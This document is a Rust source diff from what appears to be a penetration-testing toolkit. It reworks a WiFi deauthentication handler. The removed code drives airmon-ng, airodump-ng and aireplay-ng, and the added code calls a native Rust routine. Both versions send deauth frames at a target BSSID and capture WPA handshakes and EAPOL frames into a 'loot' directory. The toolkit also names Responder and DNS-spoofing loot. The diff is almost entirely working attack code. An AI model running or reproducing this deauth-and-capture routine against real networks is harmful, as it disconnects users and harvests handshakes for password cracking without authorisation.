@@ -924,138 +924,112 @@ fn handle_wifi_scan(args: WifiScanArgs) -> Result<HandlerResult> {
 }
 
 fn handle_wifi_deauth(root: &Path, args: WifiDeauthArgs) -> Result<HandlerResult> {
-    log::info!("Starting deauth attack on SSID: {}", args.ssid);
+    use crate::wireless_native::{self, DeauthConfig};
     
-    // Create Aircrack loot directory if it doesn't exist
-    let loot_dir = loot_directory(root, LootKind::Aircrack);
-    fs::create_dir_all(&loot_dir)
-        .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;
+    let ssid_display = args.ssid.clone().unwrap_or_else(|| args.bssid.clone());
+    log::info!("Starting native Rust deauth attack on BSSID: {} (SSID: {})", args.bssid, ssid_display);
     
-    // Generate output filenames with timestamp
-    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
-    let capture_prefix = loot_dir.join(format!("{}_{}", args.ssid, timestamp));
-    let log_file = loot_dir.join(format!("deauth_{}_{}.txt", args.ssid, timestamp));
-    
-    // Put interface in monitor mode
-    log::info!("Setting {} to monitor mode", args.interface);
-    let mon_interface = format!("{}mon", args.interface);
-    
-    // Kill interfering processes
-    let _ = std::process::Command::new("airmon-ng")
-        .args(&["check", "kill"])
-        .output();
-    
-    // Start monitor mode
-    let status = std::process::Command::new("airmon-ng")
-        .args(&["start", &args.interface])
-        .status()
-        .context("starting monitor mode")?;
-    
-    if !status.success() {
-        bail!("Failed to enable monitor mode on {}", args.interface);
+    // Validate BSSID format (XX:XX:XX:XX:XX:XX)
+    let mac_regex = Regex::new(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$").unwrap();
+    if !mac_regex.is_match(&args.bssid) {
+        bail!("Invalid BSSID format. Expected MAC address like AA:BB:CC:DD:EE:FF");
     }
     
-    // Start airodump-ng to capture handshake in background
-    let airodump_output = capture_prefix.to_str().unwrap();
-    let mut airodump = std::process::Command::new("airodump-ng")
-        .args(&[
-            &mon_interface,
-            "--bssid", &args.ssid,  // Note: This should be BSSID, but we'll use SSID for now
-            "-w", airodump_output,
-            "--output-format", "pcap,csv",
-        ])
-        .spawn()
-        .context("spawning airodump-ng")?;
-    
-    // Wait a moment for airodump to start
-    std::thread::sleep(Duration::from_secs(2));
-    
-    // Launch deauth attack
-    log::info!("Launching deauth attack for {} seconds", args.duration);
-    let deauth_result = std::process::Command::new("aireplay-ng")
-        .args(&[
-            "--deauth", &args.packets.to_string(),
-            "-a", &args.ssid,  // Note: This should be BSSID
-            &mon_interface,
-        ])
-        .output()
-        .context("executing aireplay-ng")?;
-    
-    // Let capture run for the duration
-    std::thread::sleep(Duration::from_secs(args.duration as u64));
-    
-    // Stop airodump
-    let _ = std::process::Command::new("pkill")
-        .arg("airodump-ng")
-        .status();
-    
-    // Kill airodump process
-    if let Err(e) = airodump.kill() {
-        log::warn!("Failed to kill airodump-ng: {}", e);
-    }
-    
-    // Stop monitor mode
-    let _ = std::process::Command::new("airmon-ng")
-        .args(&["stop", &mon_interface])
-        .status();
-    
-    // Restart interface
-    let _ = std::process::Command::new("ip")
-        .args(&["link", "set", &args.interface, "up"])
-        .status();
-    
-    // Write log file
-    let mut log_content = String::new();
-    log_content.push_str(&format!("Deauth Attack Log\n"));
-    log_content.push_str(&format!("Target SSID: {}\n", args.ssid));
-    log_content.push_str(&format!("Interface: {}\n", args.interface));
-    log_content.push_str(&format!("Duration: {} seconds\n", args.duration));
-    log_content.push_str(&format!("Packets: {}\n", args.packets));
-    log_content.push_str(&format!("Timestamp: {}\n", timestamp));
-    log_content.push_str(&format!("\nDeauth Output:\n{}\n", String::from_utf8_lossy(&deauth_result.stdout)));
-    if !deauth_result.stderr.is_empty() {
-        log_content.push_str(&format!("\nErrors:\n{}\n", String::from_utf8_lossy(&deauth_result.stderr)));
-    }
-    
-    fs::write(&log_file, log_content)
-        .with_context(|| format!("writing log file: {}", log_file.display()))?;
-    
-    // Check if handshake was captured (look for .cap files)
-    let mut handshake_captured = false;
-    let mut capture_files = Vec::new();
-    
-    if let Ok(entries) = fs::read_dir(&loot_dir) {
-        for entry in entries.flatten() {
-            let path = entry.path();
-            if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
-                if name.starts_with(&format!("{}_{}", args.ssid, timestamp)) {
-                    capture_files.push(path.display().to_string());
-                    if name.ends_with(".cap") || name.ends_with(".pcap") {
-                        handshake_captured = true;
-                    }
-                }
-            }
+    // Validate client MAC if provided
+    if let Some(ref client) = args.client {
+        if !mac_regex.is_match(client) {
+            bail!("Invalid client MAC format. Expected like AA:BB:CC:DD:EE:FF");
         }
     }
     
-    let data = json!({
-        "ssid": args.ssid,
-        "interface": args.interface,
-        "duration": args.duration,
-        "packets_sent": args.packets,
-        "log_file": log_file,
-        "capture_files": capture_files,
-        "handshake_captured": handshake_captured,
-        "loot_directory": loot_dir,
-    });
+    // Validate channel (1-14 for 2.4GHz, 36-165 for 5GHz)
+    if args.channel == 0 || (args.channel > 14 && args.channel < 36) || args.channel > 165 {
+        bail!("Invalid channel {}. Use 1-14 for 2.4GHz or 36-165 for 5GHz", args.channel);
+    }
     
-    let message = if handshake_captured {
-        "Deauth attack completed - Handshake may have been captured"
-    } else {
-        "Deauth attack completed - Check capture files"
+    // Check if we have root privileges (required for raw sockets)
+    if !wireless_native::native_available() {
+        bail!("Deauth attacks require root privileges. Run with sudo.");
+    }
+    
+    // Check if interface is wireless
+    if !wireless_native::is_wireless_interface(&args.interface) {
+        bail!("Interface {} is not a wireless interface", args.interface);
+    }
+    
+    // Check wireless capabilities
+    let caps = wireless_native::check_capabilities(&args.interface);
+    if !caps.is_attack_capable() {
+        let mut reasons = Vec::new();
+        if !caps.has_root { reasons.push("not running as root"); }
+        if !caps.interface_is_wireless { reasons.push("interface is not wireless"); }
+        if !caps.supports_monitor_mode { reasons.push("monitor mode not supported"); }
+        bail!(
+            "Interface {} is not capable of attacks: {}",
+            args.interface,
+            reasons.join(", ")
+        );
+    }
+    
+    // Create loot directory
+    let loot_dir = loot_directory(root, LootKind::Wireless);
+    fs::create_dir_all(&loot_dir)
+        .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;
+    
+    // Build deauth config for native implementation
+    let config = DeauthConfig {
+        bssid: args.bssid.clone(),
+        ssid: args.ssid.clone(),
+        channel: args.channel,
+        interface: args.interface.clone(),
+        client: args.client.clone(),
+        packets: args.packets,
+        duration: args.duration,
+        interval: args.interval,
+        continuous: args.continuous,
     };
     
-    Ok((message.to_string(), data))
+    log::info!("Executing native Rust deauth attack (rustyjack-wireless)");
+    
+    // Execute the native deauth attack
+    let result = wireless_native::execute_deauth_attack(&loot_dir, &config, |progress, status| {
+        log::debug!("Deauth progress: {:.0}% - {}", progress * 100.0, status);
+    })?;
+    
+    // Build response data
+    let data = json!({
+        "bssid": result.bssid,
+        "ssid": result.ssid,
+        "channel": result.channel,
+        "interface": args.interface,
+        "duration": result.duration_secs,
+        "packets_per_burst": args.packets,
+        "total_packets_sent": result.packets_sent,
+        "deauth_bursts": result.bursts,
+        "continuous_mode": args.continuous,
+        "target_client": args.client,
+        "log_file": result.log_file.display().to_string(),
+        "capture_files": result.capture_files.iter().map(|p| p.display().to_string()).collect::<Vec<_>>(),
+        "handshake_captured": result.handshake_captured,
+        "handshake_file": result.handshake_file.as_ref().map(|p| p.display().to_string()),
+        "eapol_frames": result.eapol_frames,
+        "loot_directory": loot_dir.display().to_string(),
+        "implementation": "native-rust",
+    });
+    
+    let message = if result.handshake_captured {
+        format!(
+            "SUCCESS: Handshake captured! ({} packets in {} bursts, {} EAPOL frames)",
+            result.packets_sent, result.bursts, result.eapol_frames
+        )
+    } else {
+        format!(
+            "Deauth completed - {} packets sent in {} bursts, no handshake captured",
+            result.packets_sent, result.bursts
+        )
+    };
+    
+    Ok((message, data))
 }
 
 fn handle_wifi_profile_list(root: &Path) -> Result<HandlerResult> {
@@ -1268,7 +1242,7 @@ fn loot_directory(root: &Path, kind: LootKind) -> PathBuf {
         LootKind::Nmap => root.join("loot").join("Nmap"),
         LootKind::Responder => root.join("Responder").join("logs"),
         LootKind::Dnsspoof => root.join("DNSSpoof").join("captures"),
-        LootKind::Aircrack => root.join("loot").join("Aircrack"),
+        LootKind::Wireless => root.join("loot").join("Wireless"),
     }
 }
 
@@ -1277,7 +1251,7 @@ fn loot_kind_label(kind: LootKind) -> &'static str {
         LootKind::Nmap => "nmap",
         LootKind::Responder => "responder",
         LootKind::Dnsspoof => "dnsspoof",
-        LootKind::Aircrack => "aircrack",
+        LootKind::Wireless => "wireless",
     }
 }
 
